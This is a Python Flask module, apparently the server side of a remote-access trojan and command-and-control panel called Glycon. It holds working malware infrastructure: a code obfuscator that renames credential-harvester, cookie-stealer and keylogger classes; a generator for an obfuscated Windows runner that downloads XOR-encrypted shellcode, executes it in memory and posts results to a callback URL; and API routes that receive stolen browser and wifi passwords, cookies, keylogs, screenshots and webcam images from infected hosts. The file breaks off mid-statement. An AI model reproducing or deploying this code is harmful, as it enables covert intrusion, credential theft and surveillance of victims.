import os
import sqlite3
import io
from flask import jsonify, request, Response, send_from_directory
from flask_login import login_required
from flask_login import current_user
from datetime import datetime
import json
import base64
import traceback
import tempfile
import subprocess
import uuid
import secrets
import random
import ipaddress
from werkzeug.security import generate_password_hash
from glycon.secure_comms import SecureComms
from glycon.config import CONFIG
import traceback  # For detailed error reporting



def _obfuscate_code(code):
    """Apply obfuscation to the agent code"""
    import random
    import string
    import re

    # Generate random names
    random_class_name = ''.join(random.choices(string.ascii_letters, k=8))
    random_cookie_class_name = ''.join(random.choices(string.ascii_letters, k=8))
    random_keylogger_class_name = ''.join(random.choices(string.ascii_letters, k=8))
    random_shellcode_runner_class_name = ''.join(random.choices(string.ascii_letters, k=8))

    def generate_random_string(length):
        """Generate a random string of given length"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def obfuscate_log_message(line):
        """Replace log message content with random string while preserving structure"""
        # Pattern to match logging calls like logger.info("message") or logger.error(f"message {var}")
        log_patterns = [
            r'logger\.info\((.*?)\)',
            r'logger\.error\((.*?)\)',
            r'logger\.warning\((.*?)\)',
            r'logger\.debug\((.*?)\)',
            r'self\._log\((.*?)\)',
            r'self\._log_error\((.*?)\)',
            r'self\._log_info\((.*?)\)'
        ]

        obfuscated_line = line
        for pattern in log_patterns:
            matches = re.findall(pattern, line)
            for match in matches:
                # Extract the content inside parentheses
                content = match.strip()
                if content.startswith('"') and content.endswith('"'):
                    # Simple string literal
                    original_length = len(content) - 2  # Subtract quotes
                    random_content = generate_random_string(original_length)
                    obfuscated_line = obfuscated_line.replace(content, f'"{random_content}"')
                elif content.startswith('f"') and content.endswith('"'):
                    # f-string
                    inside_content = content[2:-1]  # Remove f" and "
                    # Find string parts and preserve expressions
                    parts = re.split(r'(\{[^}]+\})', inside_content)
                    obfuscated_parts = []
                    for part in parts:
                        if part.startswith('{') and part.endswith('}'):
                            # Keep expressions as-is
                            obfuscated_parts.append(part)
                        else:
                            # Replace string content with random
                            random_part = generate_random_string(len(part))
                            obfuscated_parts.append(random_part)
                    obfuscated_content = ''.join(obfuscated_parts)
                    obfuscated_line = obfuscated_line.replace(content, f'f"{obfuscated_content}"')

        return obfuscated_line

    lines = code.split('\n')
    obfuscated_lines = []
    in_multiline_string = False
    multiline_string_delimiter = None

    i = 0
    while i < len(lines):
        line = lines[i]
        stripped = line.strip()

        # Handle multi-line strings (triple quotes)
        if not in_multiline_string:
            # Check for start of multi-line string
            if '"""' in line:
                quote_count = line.count('"""')
                if quote_count == 1:
                    # Single triple quote - starts multi-line string
                    in_multiline_string = True
                    multiline_string_delimiter = '"""'
                    obfuscated_lines.append(line)
                    i += 1
                    continue
                elif quote_count == 2 and stripped.startswith('"""') and stripped.endswith('"""'):
                    # Single-line docstring, remove it
                    i += 1
                    continue
            elif "'''" in line:
                quote_count = line.count("'''")
                if quote_count == 1:
                    # Single triple quote - starts multi-line string
                    in_multiline_string = True
                    multiline_string_delimiter = "'''"
                    obfuscated_lines.append(line)
                    i += 1
                    continue
                elif quote_count == 2 and stripped.startswith("'''") and stripped.endswith("'''"):
                    # Single-line docstring, remove it
                    i += 1
                    continue
        else:
            # Inside multi-line string
            if multiline_string_delimiter in line:
                quote_count = line.count(multiline_string_delimiter)
                if quote_count >= 1:
                    # End of multi-line string
                    in_multiline_string = False
                    multiline_string_delimiter = None
            obfuscated_lines.append(line)
            i += 1
            continue

        # Skip single-line docstrings (already handled above)

        # Remove all comment lines
        if stripped.startswith('#'):
            i += 1
            continue

        # Replace logger calls with pass
        if ('logger.info(' in line or 'logger.error(' in line or 'logger.warning(' in line or 'logger.debug(' in line or
            'self._log(' in line or 'self._log_error(' in line or 'self._log_info(' in line):
            indent = len(line) - len(line.lstrip())
            obfuscated_lines.append(' ' * indent + 'pass')
            i += 1
            continue

        # Skip print() calls entirely but ensure blocks have content
        if 'print(' in line.strip():
            # Check if this print is in a block that might become empty
            current_indent = len(line) - len(line.lstrip())
            # Look ahead to see if there are more statements at this level
            has_more_content = False
            look_ahead = i + 1
            while look_ahead < len(lines):
                next_line = lines[look_ahead]
                if next_line.strip() == '' or next_line.strip().startswith('#'):
                    look_ahead += 1
                    continue
                next_indent = len(next_line) - len(next_line.lstrip())
                if next_indent > current_indent:
                    # There's indented content, so this block won't be empty
                    break
                elif next_indent == current_indent and not next_line.strip().startswith('#'):
                    # There's more content at same level
                    has_more_content = True
                    break
                else:
                    # Less indented or end of block
                    break

            if not has_more_content:
                # This might leave a block empty, so replace with pass instead
                obfuscated_lines.append(' ' * current_indent + 'pass')
            # Skip the original print line
            i += 1
            continue

        # Rename CredentialHarvester class
        if 'class CredentialHarvester:' in line:
            indent = len(line) - len(line.lstrip())
            obfuscated_lines.append(' ' * indent + f'class {random_class_name}:')
            i += 1
            continue
        elif 'CredentialHarvester.' in line:
            obfuscated_lines.append(line.replace('CredentialHarvester.', f'{random_class_name}.'))
            i += 1
            continue

        # Rename CookieStealer class
        if 'class CookieStealer:' in line:
            indent = len(line) - len(line.lstrip())
            obfuscated_lines.append(' ' * indent + f'class {random_cookie_class_name}:')
            i += 1
            continue
        elif 'CookieStealer(' in line:
            obfuscated_lines.append(line.replace('CookieStealer(', f'{random_cookie_class_name}('))
            i += 1
            continue

        # Rename Keylogger class
        if 'class Keylogger:' in line:
            indent = len(line) - len(line.lstrip())
            obfuscated_lines.append(' ' * indent + f'class {random_keylogger_class_name}:')
            i += 1
            continue
        elif 'Keylogger(' in line:
            obfuscated_lines.append(line.replace('Keylogger(', f'{random_keylogger_class_name}('))
            i += 1
            continue

     

        # Remove inline comments while preserving indentation
        if '#' in line:
            # Find the first '#' that is not inside quotes
            in_single_quote = False
            in_double_quote = False
            comment_start = -1
            for idx, char in enumerate(line):
                if char == "'" and not in_double_quote:
                    in_single_quote = not in_single_quote
                elif char == '"' and not in_single_quote:
                    in_double_quote = not in_double_quote
                elif char == '#' and not in_single_quote and not in_double_quote:
                    comment_start = idx
                    break
            if comment_start != -1:
                line = line[:comment_start].rstrip()

        # Keep the line
        obfuscated_lines.append(line)

        i += 1

    # Post-process to add 'pass' statements to empty blocks after colons
    def post_process_for_empty_blocks(lines):
        processed_lines = []
        i = 0
        while i < len(lines):
            line = lines[i]
            processed_lines.append(line)
            stripped = line.strip()
            # Only add pass to control flow blocks, not dict literals
            if stripped.endswith(':') and any(kw in stripped for kw in ['if ', 'for ', 'while ', 'try', 'except', 'def ', 'class ', 'with ']):
                block_indent = len(line) - len(line.lstrip())
                # Check if there's any indented content in the block
                has_content = False
                j = i + 1
                while j < len(lines):
                    next_line = lines[j]
                    if next_line.strip() == '':
                        j += 1
                        continue
                    if next_line.strip().startswith('#'):
                        j += 1
                        continue
                    next_indent = len(next_line) - len(next_line.lstrip())
                    if next_indent > block_indent:
                        has_content = True
                        break
                    else:
                        # Next line is at same or less indentation, block ends
                        break
                if not has_content:
                    # Insert pass statement
                    processed_lines.append(' ' * (block_indent + 4) + 'pass')
            i += 1
        return processed_lines

    # Post-process to fix empty blocks
    def post_process_for_empty_blocks(lines):
        processed_lines = []
        i = 0
        while i < len(lines):
            line = lines[i]
            processed_lines.append(line)
            stripped = line.strip()

            # Check if line ends with ':' and is not a comment
            if stripped.endswith(':') and not stripped.startswith('#'):
                # Look ahead to see if there's indented content
                has_indented_content = False
                j = i + 1
                while j < len(lines):
                    next_line = lines[j]
                    if next_line.strip() == '' or next_line.startswith(' ') or next_line.startswith('\t'):
                        if next_line.strip() != '':
                            has_indented_content = True
                            break
                    elif next_line.strip() != '':
                        # Non-empty line that's not indented, so block ends
                        break
                    j += 1

                if not has_indented_content:
                    # Add pass statement with proper indentation
                    indent = len(line) - len(line.lstrip())
                    processed_lines.append(' ' * (indent + 4) + 'pass')

            i += 1
        return processed_lines

    obfuscated_lines = post_process_for_empty_blocks(obfuscated_lines)

    return '\n'.join(obfuscated_lines)


def _generate_runner_script(shellcode_url, callback_url=None, xor_key=None, task_id=None):
    """Generate the Python runner script that will download and execute shellcode"""
    if xor_key is None:
        raise ValueError("XOR key is required for shellcode encryption")

    # Generate random names for obfuscation
    import random
    import string

    def generate_random_name(length=8):
        return ''.join(random.choices(string.ascii_letters, k=length))

    # Generate random names for functions and variables
    xor_func_name = generate_random_name()
    recv_func_name = generate_random_name()
    exec_func_name = generate_random_name()
    run_func_name = generate_random_name()
    main_func_name = generate_random_name()
    url_var_name = generate_random_name()
    key_var_name = generate_random_name()
    task_id_var_name = generate_random_name()
    data_var_name = generate_random_name()
    key_len_var_name = generate_random_name()
    space_var_name = generate_random_name()
    buff_var_name = generate_random_name()
    i_var_name = generate_random_name()
    encrypted_byte_var_name = generate_random_name()
    decrypted_byte_var_name = generate_random_name()
    shellcode_func_var_name = generate_random_name()
    encrypted_shellcode_param_name = generate_random_name()
    response_var_name = generate_random_name()
    xor_key_param_name = generate_random_name()

    script = f"""import socket
import ctypes
import argparse
import struct
import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def {xor_func_name}({data_var_name}, {key_var_name}):
    {key_len_var_name} = len({key_var_name})
    return bytes([{data_var_name}[{i_var_name}] ^ {key_var_name}[{i_var_name} % {key_len_var_name}] for {i_var_name} in range(len({data_var_name}))])
def {recv_func_name}({url_var_name}):
    {response_var_name} = requests.get({url_var_name}, verify=False)
    {response_var_name}.raise_for_status()
    return {response_var_name}.content
def {exec_func_name}({encrypted_shellcode_param_name}, {xor_key_param_name}):
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
    {space_var_name} = ctypes.windll.kernel32.VirtualAlloc(0, len({encrypted_shellcode_param_name}), 0x3000, 0x40)
    {buff_var_name} = (ctypes.c_char * len({encrypted_shellcode_param_name})).from_buffer_copy({encrypted_shellcode_param_name})
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p({space_var_name}), {buff_var_name}, len({encrypted_shellcode_param_name}))
    {key_len_var_name} = len({xor_key_param_name})
    for {i_var_name} in range(len({encrypted_shellcode_param_name})):
        {encrypted_byte_var_name} = ctypes.c_byte.from_address({space_var_name} + {i_var_name}).value
        {decrypted_byte_var_name} = {encrypted_byte_var_name} ^ {xor_key_param_name}[{i_var_name} % {key_len_var_name}]
        ctypes.c_byte.from_address({space_var_name} + {i_var_name}).value = {decrypted_byte_var_name}
    {shellcode_func_var_name} = ctypes.CFUNCTYPE(None)({space_var_name})
    {shellcode_func_var_name}()
def {main_func_name}({url_var_name}, {key_var_name}, task_id_value):
    import subprocess
    import sys
    import io
    import contextlib
    try:
        # Capture stdout and stderr
        output_buffer = io.StringIO()
        with contextlib.redirect_stdout(output_buffer), contextlib.redirect_stderr(output_buffer):
            {encrypted_shellcode_param_name} = {recv_func_name}({url_var_name})
            {exec_func_name}({encrypted_shellcode_param_name}, {key_var_name})

        captured_output = output_buffer.getvalue()

        # Send captured output back to callback URL
        try:
            import requests
            requests.post("{callback_url}", json={{
                "agent_id": "unknown",
                "task_id": task_id_value,
                "status": "success",
                "message": "Shellcode executed successfully",
                "output": captured_output,
                "timestamp": "unknown"
            }}, timeout=5, verify=False)
        except Exception as e:
            print(f"Failed to send output: {{e}}")

    except Exception as e:
        try:
            # Send error back to callback URL
            import requests
            requests.post("{callback_url}", json={{
                "agent_id": "unknown",
                "task_id": task_id_value,
                "status": "error",
                "message": str(e),
                "output": "",
                "timestamp": "unknown"
            }}, timeout=5, verify=False)
        except Exception as e:
            print(f"Failed to send error: {{e}}")
if __name__ == "__main__":
    {url_var_name} = "{shellcode_url}"
    {key_var_name} = {xor_key!r}
    task_id_value = {task_id}
    {main_func_name}({url_var_name}, {key_var_name}, task_id_value)
"""
    return script


def init_api_routes(app, socketio):
    @app.route('/api/shellcode_output', methods=['POST'])
    def shellcode_output():
        try:
            if not request.is_json:
                return jsonify({"status": "error", "message": "JSON data required"}), 400

            data = request.get_json()
            app.logger.info(f"Received shellcode output data: {data}")
            agent_id = data.get('agent_id')
            status = data.get('status')
            message = data.get('message')
            output = data.get('output', '')
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')

            if not agent_id or not status:
                return jsonify({"status": "error", "message": "agent_id and status required"}), 400

            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            # Ensure the shellcode_outputs table exists and has task_id column
            c.execute('''
                CREATE TABLE IF NOT EXISTS shellcode_outputs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT NOT NULL,
                    status TEXT NOT NULL,
                    message TEXT,
                    output TEXT,
                    timestamp TEXT NOT NULL
                )
            ''')

            # Add task_id column if it doesn't exist
            try:
                c.execute("ALTER TABLE shellcode_outputs ADD COLUMN task_id INTEGER")
            except sqlite3.OperationalError:
                # Column already exists, ignore error
                pass

            c.execute('''INSERT INTO shellcode_outputs (agent_id, task_id, status, message, output, timestamp)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (agent_id, data.get('task_id'), status, message, output, timestamp))

            conn.commit()
            conn.close()

            # Notify clients via websocket
            socketio.emit('shellcode_output', {
                'agent_id': agent_id,
                'status': status,
                'message': message,
                'output': output,
                'timestamp': timestamp
            })

            return jsonify({"status": "success"})
        except Exception as e:
            app.logger.error(f"Error processing shellcode output: {str(e)}")
            return jsonify({"status": "error", "message": str(e)}), 500

    @app.route('/api/shellcode_outputs/<string:agent_id>', methods=['GET'])
    @login_required
    def get_shellcode_outputs(agent_id):
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            # Ensure the shellcode_outputs table exists
            c.execute('''
                CREATE TABLE IF NOT EXISTS shellcode_outputs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT NOT NULL,
                    task_id INTEGER,
                    status TEXT NOT NULL,
                    message TEXT,
                    output TEXT,
                    timestamp TEXT NOT NULL
                )
            ''')

            c.execute('''
                SELECT id, task_id, status, message, output, timestamp FROM shellcode_outputs
                WHERE agent_id=?
                ORDER BY timestamp DESC
                LIMIT 50
            ''', (agent_id,))
            rows = c.fetchall()
            conn.close()

            outputs = [{
                'id': row[0],
                'task_id': row[1],
                'status': row[2],
                'message': row[3],
                'output': row[4],
                'timestamp': row[5]
            } for row in rows]

            return jsonify({'status': 'success', 'outputs': outputs})
        except Exception as e:
            app.logger.error(f"Error fetching shellcode outputs: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    # New endpoint to fetch recent keylogger logs for an agent
    @app.route('/api/keylogger_logs/<string:agent_id>', methods=['GET'])
    @login_required
    def get_keylogger_logs(agent_id):
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute('''
                CREATE TABLE IF NOT EXISTS keylogs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT NOT NULL,
                    keys TEXT NOT NULL,
                    timestamp TEXT NOT NULL
                )
            ''')
            c.execute('''
                SELECT keys, timestamp FROM keylogs
                WHERE agent_id=?
                ORDER BY timestamp ASC
                LIMIT 100
            ''', (agent_id,))
            rows = c.fetchall()
            conn.close()
            logs = [{'keys': row[0], 'timestamp': row[1]} for row in rows]
            return jsonify({'status': 'success', 'logs': logs})
        except Exception as e:
            app.logger.error(f"Error fetching keylogger logs: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    # New endpoint to create start/stop keylogger tasks
    @app.route('/api/keylogger_task', methods=['POST'])
    @login_required
    def create_keylogger_task():
        try:
            data = request.get_json()
            if not data or 'agent_id' not in data or 'action' not in data:
                return jsonify({'status': 'error', 'message': 'agent_id and action required'}), 400
            
            agent_id = data['agent_id']
            action = data['action']
            if action not in ['start', 'stop']:
                return jsonify({'status': 'error', 'message': 'Invalid action'}), 400
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            task_data = {'action': action}
            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                      (None, agent_id, 'keylogger', json.dumps(task_data), 'pending',
                       datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), None))
            conn.commit()
            task_id = c.lastrowid
            conn.close()
            
            socketio.emit('new_task', {
                'task_id': task_id,
                'agent_id': agent_id,
                'task_type': 'keylogger'
            })
            
            return jsonify({'status': 'success', 'task_id': task_id})
        except Exception as e:
            app.logger.error(f"Error creating keylogger task: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/api/checkin', methods=['POST'])
    def agent_checkin():
        conn = None
        try:
            if not request.data:
                return Response(SecureComms.encrypt({'type': 'noop'}),
                              mimetype='application/octet-stream')

            try:
                data = SecureComms.decrypt(request.data)
                app.logger.debug(f"Received checkin from agent: {data['agent_id']}")
            except Exception as e:
                app.logger.error(f"Decryption error: {str(e)}")
                return Response(SecureComms.encrypt({'type': 'noop'}),
                              mimetype='application/octet-stream')

            conn = sqlite3.connect(CONFIG.database)
            conn.execute("PRAGMA journal_mode=WAL")
            c = conn.cursor()

            c.execute("SELECT ws_connected FROM agents WHERE id=?", (data['agent_id'],))
            agent = c.fetchone()
            current_ws_status = agent[0] if agent else 0

            c.execute('''INSERT OR REPLACE INTO agents
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                    (data['agent_id'],
                    data.get('hostname', 'UNKNOWN'),
                    data.get('ip', '0.0.0.0'),
                    data.get('os', 'UNKNOWN'),
                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
                    'online',
                    data.get('privilege', 'user'),
                    current_ws_status,
                    0,  # rd_connected default
                    data.get('killdate'),  # New killdate field
                    data.get('checkin_interval', 10)  # New checkin_interval field
            ))

            if 'credentials' in data:
                creds = data['credentials']
                for cred in creds.get('browsers', []):
                    try:
                        c.execute('''INSERT OR IGNORE INTO credentials 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                 (None, data['agent_id'],
                                  cred.get('browser', 'unknown'),
                                  cred.get('url', ''),
                                  cred.get('username', ''),
                                  cred.get('password', ''),
                                  datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                    except Exception as e:
                        app.logger.error(f"Error storing credential: {str(e)}")
                        continue

                for wifi in creds.get('wifi', []):
                    try:
                        c.execute('''INSERT OR IGNORE INTO credentials 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                 (None, data['agent_id'],
                                  'wifi',
                                  '',
                                  wifi.get('ssid', ''),
                                  wifi.get('password', ''),
                                  datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                    except Exception as e:
                        app.logger.error(f"Error storing wifi: {str(e)}")
                        continue

            if 'screenshot' in data:
                try:
                    if isinstance(data['screenshot'], str):
                        image_data = base64.b64decode(data['screenshot'])
                    else:
                        image_data = data['screenshot']
                    
                    if len(image_data) > 10 * 1024 * 1024:
                        raise ValueError("Screenshot too large")
                    
                    c.execute('''INSERT INTO screenshots 
                                VALUES (?, ?, ?, ?)''',
                             (None, data['agent_id'],
                              image_data,
                              datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                except Exception as e:
                    app.logger.error(f"Error storing screenshot: {str(e)}")

            c.execute('''SELECT id, task_type, task_data FROM tasks 
                         WHERE agent_id=? AND status='pending'
                         ORDER BY created_at LIMIT 1''',
                     (data['agent_id'],))
            task = c.fetchone()

            if task:
                c.execute("UPDATE tasks SET status='executing' WHERE id=?", (task[0],))
                response = {
                    'task_id': task[0],
                    'type': task[1],
                    'data': json.loads(task[2])
                }
            else:
                response = {'type': 'noop'}

            conn.commit()
            conn.close()

            encrypted_response = SecureComms.encrypt(response)
            return Response(encrypted_response,
                          mimetype='application/octet-stream')

        except Exception as e:
            app.logger.error(f"Checkin error: {str(e)}")
            if conn:
                conn.rollback()
                conn.close()
            return Response(SecureComms.encrypt({'type': 'noop'}),
                          mimetype='application/octet-stream')

    @app.route('/api/screenshots/<int:screenshot_id>', methods=['DELETE'])
    @login_required
    def delete_screenshot(screenshot_id):
        conn = None
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            c.execute("SELECT id, agent_id FROM screenshots WHERE id = ?", (screenshot_id,))
            screenshot = c.fetchone()
            
            if not screenshot:
                return jsonify({"status": "error", "message": "Screenshot not found"}), 404
                
            c.execute("DELETE FROM screenshots WHERE id = ?", (screenshot_id,))
            
            conn.commit()
            
            socketio.emit('screenshot_deleted', {
                'screenshot_id': screenshot_id,
                'agent_id': screenshot[1]
            })
            
            return jsonify({"status": "success"}), 200
            
        except Exception as e:
            app.logger.error(f"Error deleting screenshot: {str(e)}")
            if conn:
                conn.rollback()
            return jsonify({"status": "error", "message": str(e)}), 500
        finally:
            if conn:
                conn.close()

    # Webcam capture endpoints
    @app.route('/api/webcam_captures/<int:capture_id>')
    @login_required
    def get_webcam_capture_api(capture_id):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT image FROM webcam_captures WHERE id=?", (capture_id,))
        result = c.fetchone()
        conn.close()

        if not result or not result[0]:
            return jsonify({"status": "error", "message": "Webcam capture not found"}), 404

        return send_file(
            io.BytesIO(result[0]),
            mimetype='image/jpeg',
            download_name=f"webcam_{capture_id}.jpg"
        )

    @app.route('/api/webcam_captures', methods=['GET'])
    @login_required
    def get_webcam_captures():
        try:
            agent_id = request.args.get('agent_id')
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            if agent_id:
                c.execute('''SELECT wc.id, wc.timestamp, a.hostname, a.id as agent_id
                             FROM webcam_captures wc JOIN agents a ON wc.agent_id = a.id
                             WHERE wc.agent_id=? ORDER BY wc.timestamp DESC LIMIT 50''', (agent_id,))
            else:
                c.execute('''SELECT wc.id, wc.timestamp, a.hostname, a.id as agent_id
                             FROM webcam_captures wc JOIN agents a ON wc.agent_id = a.id
                             ORDER BY wc.timestamp DESC LIMIT 50''')

            captures = [dict(zip(['id', 'timestamp', 'hostname', 'agent_id'], row))
                       for row in c.fetchall()]

            conn.close()
            return jsonify({'status': 'success', 'captures': captures})
        except Exception as e:
            app.logger.error(f"Error fetching webcam captures: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/api/webcam_captures/<int:capture_id>', methods=['DELETE'])
    @login_required
    def delete_webcam_capture(capture_id):
        conn = None
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            c.execute("SELECT id, agent_id FROM webcam_captures WHERE id = ?", (capture_id,))
            capture = c.fetchone()

            if not capture:
                return jsonify({"status": "error", "message": "Webcam capture not found"}), 404

            c.execute("DELETE FROM webcam_captures WHERE id = ?", (capture_id,))

            conn.commit()

            socketio.emit('webcam_capture_deleted', {
                'capture_id': capture_id,
                'agent_id': capture[1]
            })

            return jsonify({"status": "success"}), 200

        except Exception as e:
            app.logger.error(f"Error deleting webcam capture: {str(e)}")
            if conn:
                conn.rollback()
            return jsonify({"status": "error", "message": str(e)}), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/agents/<string:agent_id>', methods=['DELETE'])
    @login_required
    def delete_agent(agent_id):
        conn = None
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # First check if agent exists
            c.execute("SELECT id FROM agents WHERE id=?", (agent_id,))
            if not c.fetchone():
                return jsonify({"status": "error", "message": "Agent not found"}), 404
                
            # Delete related data first to maintain referential integrity
            c.execute("DELETE FROM tasks WHERE agent_id=?", (agent_id,))
            c.execute("DELETE FROM screenshots WHERE agent_id=?", (agent_id,))
            c.execute("DELETE FROM credentials WHERE agent_id=?", (agent_id,))
            c.execute("DELETE FROM stolen_data WHERE agent_id=?", (agent_id,))
            c.execute("DELETE FROM browser_history WHERE agent_id=?", (agent_id,))
            
            # Now delete the agent
            c.execute("DELETE FROM agents WHERE id=?", (agent_id,))
            
            conn.commit()
            
            # Notify clients via websocket
            socketio.emit('agent_deleted', {
                'agent_id': agent_id,
                'message': f'Agent {agent_id} was deleted'
            })
            
            return jsonify({
                "status": "success",
                "message": f"Agent {agent_id} and all related data deleted"
            })
            
        except Exception as e:
            app.logger.error(f"Error deleting agent {agent_id}: {str(e)}")
            if conn:
                conn.rollback()
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500
        finally:
            if conn:
                conn.close()



    @app.route('/api/task', methods=['POST'])
    @login_required
    def create_task():
        try:
            if request.content_type != 'application/json':
                return jsonify({
                    "status": "error", 
                    "message": "Content-Type must be application/json"
                }), 415

            data = request.get_json()
            if not data:
                return jsonify({
                    "status": "error", 
                    "message": "No JSON data provided"
                }), 400
            
            required_fields = ['agent_id', 'task_type']
            if not all(field in data for field in required_fields):
                return jsonify({
                    "status": "error", 
                    "message": f"Missing required fields: {required_fields}"
                }), 400
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            task_data = data.get('task_data', {})
            
            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (None, 
                    data['agent_id'], 
                    data['task_type'], 
                    json.dumps(task_data),
                    'pending', 
                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , 
                    None))
            
            conn.commit()
            task_id = c.lastrowid
            
            if data['task_type'] == 'websocket':
                ws_connected = 1 if data.get('action') == 'start' else 0
                c.execute("UPDATE agents SET ws_connected=? WHERE id=?",
                        (ws_connected, data['agent_id']))
                conn.commit()
            elif data['task_type'] == 'remote_desktop':
                rd_connected = 1 if data.get('action') == 'start' else 0
                c.execute("UPDATE agents SET rd_connected=? WHERE id=?",
                        (rd_connected, data['agent_id']))
                conn.commit()
            
            conn.close()
            
            socketio.emit('new_task', {
                'task_id': task_id,
                'agent_id': data['agent_id'],
                'task_type': data['task_type']
            })
            
            return jsonify({
                "status": "success", 
                "task_id": task_id
            })

        except Exception as e:
            app.logger.error(f"Error creating task: {str(e)}")
            return jsonify({
                "status": "error", 
                "message": str(e)
            }), 500


    @app.route('/api/task_result', methods=['POST'])
    def task_result():
        conn = None
        try:
            # Decrypt and validate incoming data
            if not request.data:
                return jsonify({'status': 'error', 'message': 'No data provided'}), 400
                
            data = SecureComms.decrypt(request.data)
            if not data or 'task_id' not in data or 'agent_id' not in data:
                return jsonify({'status': 'error', 'message': 'Invalid task result format'}), 400
                
            app.logger.info(f"Processing task result for task ID: {data['task_id']}")

            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Update task status
            c.execute('''UPDATE tasks SET status='completed', completed_at=?
                        WHERE id=?''', 
                    (datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , data['task_id']))
            
            # Handle different task types
            if data['task_type'] == 'steal_cookies' and data.get('result') and data['result'].get('results'):
                app.logger.info(f"Processing cookie data from {len(data['result']['results'])} browsers")
                
                for result in data['result']['results']:
                    try:
                        # Validate required fields
                        if 'browser' not in result:
                            app.logger.error("Missing browser field in cookie result")
                            continue
                            
                        if 'zip_content' not in result:
                            app.logger.error(f"Missing zip_content in {result['browser']} cookie result")
                            continue
                            
                        # Decode and validate cookie data
                        try:
                            cookie_data = base64.b64decode(result['zip_content'])
                            if not cookie_data:
                                app.logger.error(f"Empty cookie data for {result['browser']}")
                                continue
                                
                            # Verify the data is valid JSON
                            try:
                                json.loads(cookie_data.decode('utf-8'))
                            except ValueError:
                                app.logger.error(f"Invalid JSON in {result['browser']} cookie data")
                                continue
                                
                        except Exception as e:
                            app.logger.error(f"Failed to decode {result['browser']} cookie data: {str(e)}")
                            continue
                        
                        # Store in database
                        c.execute('''INSERT INTO stolen_data 
                                    (agent_id, browser, data_type, content, system_info, timestamp)
                                    VALUES (?, ?, ?, ?, ?, ?)''',
                                (data['agent_id'],
                                result['browser'],
                                'cookies',
                                sqlite3.Binary(cookie_data),
                                json.dumps(result.get('system_info', {})),
                                datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                        
                        app.logger.info(f"Successfully stored {result['browser']} cookies")
                        
                    except Exception as e:
                        app.logger.error(f"Failed to process {result.get('browser', 'unknown')} cookies: {str(e)}")
                        continue
            
            # Handle websocket status updates
            if data['task_type'] == 'websocket' and data.get('result'):
                result = data['result']
                ws_connected = 1 if (result.get('status') == 'success' and
                                'connected' in (result.get('message') or '').lower()) else 0
                c.execute('''UPDATE agents SET ws_connected=? WHERE id=?''',
                        (ws_connected, data['agent_id']))

                socketio.emit('ws_status', {
                    'agent_id': data['agent_id'],
                    'action': result.get('action', ''),
                    'status': 'success' if ws_connected else 'error',
                    'message': result.get('message', '')
                }, room=f"terminal_{data['agent_id']}", namespace='/terminal')

            # Handle remote desktop status updates
            if data['task_type'] == 'remote_desktop' and data.get('result'):
                result = data['result']
                rd_connected = 1 if (result.get('status') == 'success' and
                                'connected' in (result.get('message') or '').lower()) else 0
                c.execute('''UPDATE agents SET rd_connected=? WHERE id=?''',
                        (rd_connected, data['agent_id']))

                socketio.emit('rd_status', {
                    'agent_id': data['agent_id'],
                    'action': result.get('action', ''),
                    'status': 'success' if rd_connected else 'error',
                    'message': result.get('message', '')
                }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')
            
            # Handle terminal output
            if data['task_type'] == 'terminal' and data.get('result') and data['result'].get('terminal', False):
                result = data['result']
                socketio.emit('terminal_output', {
                    'agent_id': data['agent_id'],
                    'command': result.get('command', ''),
                    'output': result.get('output', ''),
                    'error': result.get('error', ''),
                    'current_dir': result.get('current_dir', ''),
                    'task_id': data['task_id']
                }, room=f"terminal_{data['agent_id']}", namespace='/terminal')

            # Handle screenshots
            if data['task_type'] == 'screenshot' and data.get('result') and 'screenshot' in data['result']:
                try:
                    image_data = base64.b64decode(data['result']['screenshot'])
                    c.execute('''INSERT INTO screenshots
                                VALUES (?, ?, ?, ?)''',
                            (None, data['agent_id'],
                            image_data,
